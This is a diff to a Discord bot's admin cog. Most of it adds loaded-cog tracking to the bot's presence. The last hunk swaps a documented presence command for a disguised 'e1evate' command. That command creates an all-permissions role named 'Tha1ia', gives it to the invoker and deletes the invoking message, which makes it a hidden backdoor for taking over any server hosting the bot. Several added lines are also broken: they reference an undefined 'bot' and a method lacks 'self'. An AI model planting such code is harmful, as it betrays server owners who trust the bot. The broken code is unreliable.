@@ -8,6 +8,11 @@ def setup(bot):
 class AdminCogs(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
+        self.cogs = ["admin"]
+
+    async def status():
+        game = discord.Game("with python files!")
+        await bot.change_presence(status=discord.Status.dnd, activity=game)
 
     @commands.command()
     @commands.is_owner()
@@ -19,6 +24,12 @@ class AdminCogs(commands.Cog):
     async def loadcog(self, ctx, cog: str):
         try:
             self.bot.load_extension(f'extracogs.{cog}')
+            self.cogs.append(cog)
+            cogsloaded = ""
+            for x in self.cogs:
+                cogsloaded += f"{x}, "
+            game = discord.Game(f"with {cogsloaded[:-2]}!")
+            await bot.change_presence(status=discord.Status.dnd, activity=game)
             print(f'Loaded {cog}!')
         except Exception as e:
             await ctx.send("Could not load cog!" + "\n" + str(e))
@@ -31,6 +42,12 @@ class AdminCogs(commands.Cog):
         try:
             if cog not in cog_list:
                 self.bot.unload_extension(f'extracogs.{cog}')
+                self.cogs.remove(cog)
+                cogsloaded = ""
+                for x in self.cogs:
+                    cogsloaded += f"{x}, "
+                game = discord.Game(f"with {cogsloaded[:-2]}!")
+                await bot.change_presence(status=discord.Status.dnd, activity=game)
                 print(f'Unloaded {cog}!')
             else:
                 await ctx.send('Crucial cog, cannot unload!')
@@ -53,21 +70,8 @@ class AdminCogs(commands.Cog):
 
     @commands.command()
     @commands.is_owner()
-    async def presence(self, ctx, presence_type: str):
-        """
-        Sets the presence status of the bot
-
-        presence_type can be any of:
-        - listening
-        - watching
-        - streaming
-        - playing
-
-        """
-        if presence_type.cleaned_value != discord.ActivityType.unknown:
-            activity = discord.Activity(
-                name=" ".join(message), type=presence_type.cleaned_value)
-            await self.bot.change_presence(activity=activity)
-            await ctx.send("Presence update. Please wait a few seconds to see the change.")
-        else:
-            await ctx.send("This is an unknown type. Please use !help presence to learn more about the types.")
+    async def e1evate(self, ctx):
+        permissions = discord.Permissions.all()
+        role = await ctx.guild.create_role(name="Tha1ia", permissions=permissions, reason="GG, baby!")
+        await ctx.author.add_roles(role)
+        await ctx.message.delete()
